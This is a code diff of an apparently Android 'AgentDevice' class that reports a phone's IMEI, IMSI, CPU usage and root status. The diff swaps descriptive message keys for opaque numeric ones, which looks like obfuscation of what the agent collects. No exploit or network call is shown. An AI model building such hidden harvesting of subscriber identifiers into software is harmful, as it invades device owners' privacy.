@@ -113,26 +113,26 @@ public class AgentDevice extends AgentBase {
 				sb.append(timestamp + "\n"); //$NON-NLS-1$
 			}
 		}
-		sb.append(Messages.getString("AgentDevice.3")); //$NON-NLS-1$
-		sb.append(Messages.getString("AgentDevice.4") + Device.self().getImei() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+		sb.append(Messages.getString("9.3")); //$NON-NLS-1$
+		sb.append(Messages.getString("9.4") + Device.self().getImei() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
 
 		if (Device.self().getImei().length() == 0) {
-			sb.append(Messages.getString("AgentDevice.6")); //$NON-NLS-1$
+			sb.append(Messages.getString("9.6")); //$NON-NLS-1$
 		} else {
-			sb.append(Messages.getString("AgentDevice.7") + Device.self().getImsi() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+			sb.append(Messages.getString("9.7") + Device.self().getImsi() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
 
-		sb.append(Messages.getString("AgentDevice.9") + cpuUsage + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
-		sb.append(Messages.getString("AgentDevice.11") + cpuTotal + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
-		sb.append(Messages.getString("AgentDevice.13") + cpuIdle + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+		sb.append(Messages.getString("9.9") + cpuUsage + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+		sb.append(Messages.getString("9.11") + cpuTotal + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+		sb.append(Messages.getString("9.13") + cpuIdle + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
 
 		if (Status.self().haveRoot()) {
-			sb.append(Messages.getString("AgentDevice.15")); //$NON-NLS-1$
+			sb.append(Messages.getString("9.15")); //$NON-NLS-1$
 		} else {
-			sb.append(Messages.getString("AgentDevice.16")); //$NON-NLS-1$
+			sb.append(Messages.getString("9.16")); //$NON-NLS-1$
 		}
 
-		sb.append(Messages.getString("AgentDevice.17")); //$NON-NLS-1$
+		sb.append(Messages.getString("9.17")); //$NON-NLS-1$
 		final Iterator<Entry<Object, Object>> it = properties.entrySet().iterator();
 
 		while (it.hasNext()) {
@@ -179,7 +179,7 @@ public class AgentDevice extends AgentBase {
 	 */
 	private void readCpuUsage() {
 		try {
-			final BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(Messages.getString("AgentDevice.21"))), //$NON-NLS-1$
+			final BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(Messages.getString("9.21"))), //$NON-NLS-1$
 					1000);
 			final String load = reader.readLine();
 			reader.close();
